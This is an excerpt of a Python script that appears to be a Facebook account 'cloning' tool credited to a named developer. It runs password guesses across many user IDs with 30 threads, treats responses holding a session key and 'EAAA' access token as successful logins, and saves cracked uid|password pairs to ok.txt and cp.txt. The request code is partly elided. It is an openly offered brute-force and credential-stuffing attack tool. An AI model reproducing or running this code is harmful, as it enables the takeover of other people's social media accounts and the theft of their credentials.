...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/Mula.asm81"])

	exit(" [*] FACEBOOK :  https://www.facebook.com/Mula.asm81")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Asm MobarakWahidy")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/Mamad181281/apporved/main/New%20paid%F0%9F%99%83').text
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :            DacTar MaMad Kunduzi 

     \033[1;91m➣ \033[1;92mFACEBOOK   :            Asm Mobarak Wahidy 

     \033[1;93m➣ \033[1;92mWHATSAPP   :            0728181281

     \033[1;96m➣ \033[1;92mGITHUB     :            Mamad181281

     \033[1;95m➣ \033[1;92mTOOLS      :            Old Fb Cloning 

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

    """)

		print("%s [%sâ€¢%s] %sTOOL NAME : %sOID CLON"%(G,R,G,Y,G))
...
#				exit()
	...
	def email(self):
		...
		nam = input("%s [?] TYPE A NAME %s(EX:MaMad ): "%(Y,G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [!] USE %s, %s(COMMA)%s FOR MaMad "%(Y,G,B,Y))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s\033[0;93m[>_] [MAMAD] : \033[0;97m %s/%s -> \033[0;92m [MAMAD-OK:%s ]- \033[0;93m[MAMAD-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[MAMAD-OK] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [MAMAD-OK] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[MAMAD-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [MAMAD-CP] %s|%s\n"%(uid, pw))
